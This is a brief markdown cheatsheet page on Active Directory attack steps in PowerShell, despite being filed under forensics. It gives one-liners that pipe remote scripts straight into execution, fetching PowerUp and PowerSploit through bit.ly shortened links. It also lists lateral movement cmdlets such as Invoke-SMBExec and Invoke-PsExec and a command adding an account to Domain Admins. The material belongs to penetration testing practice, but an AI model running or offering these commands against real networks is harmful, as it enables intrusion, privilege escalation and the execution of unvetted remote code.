---
layout: default
title: Active Directory Enumeration with Powershell 
parent: Forensic
categories: Forensics Windows
grand_parent: Cheatsheets
has_children: true
---

# {{ page.title}}

## PRE-REQUISITE: Installing PowerView, PowerUp and PowerSploit

```powershell
# ActiveDirectory Module
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# PowerUp Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\PowerUp.ps1

# PowerSploit Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1

```

## LATERAL MOVEMENT
```powershell
Invoke-DCOM
Invoke-SMBExec
Invoke-PsExec
Invoke-Command
mstsc.exe
```

## TOKEN IMPERSONATION

## ADD MEMBER
```
net group "Domain admins" dfm.a /add /domain  
```
